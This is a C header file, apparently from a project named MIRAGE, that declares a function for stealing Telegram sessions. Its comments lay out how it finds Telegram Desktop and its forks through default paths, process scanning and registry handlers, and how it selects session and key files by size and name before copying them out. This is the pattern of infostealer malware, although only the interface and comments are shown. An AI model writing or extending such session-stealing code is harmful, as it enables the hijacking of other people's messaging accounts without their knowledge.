/*
 * telegram_tdata.h — Telegram tdata session collection.
 *
 * Discovers Telegram Desktop installations (including forks) via:
 *   1. Hardcoded default paths (Telegram Desktop, AyuGram, Nekogram, Kotatogram, ...)
 *   2. Process scan (NtGetNextProcess — finds running Telegram instances)
 *   3. Registry scan (HKCR\tg\, HKCR\tdesktop.tg\ command handlers)
 *
 * Collects session data files (<=7120 bytes), 16-char-named subdirs,
 * and key/settings files.  Skips caches (tdummy, versions, dumps).
 *
 * Guarded by #ifdef ENABLE_TELEGRAM.
 */
#ifndef MIRAGE_TELEGRAM_TDATA_H
#define MIRAGE_TELEGRAM_TDATA_H

#include <stddef.h>

#ifdef __cplusplus
extern "C" {
#endif

/*
 * collect_telegram_tdata — Discover all Telegram tdata directories
 * and copy qualifying session files into output_dir.
 *
 * Returns 0 on success (even if nothing found), -1 on fatal error.
 * output_dir must already exist.
 */
int collect_telegram_tdata(const char *output_dir);

#ifdef __cplusplus
}
#endif

#endif /* MIRAGE_TELEGRAM_TDATA_H */
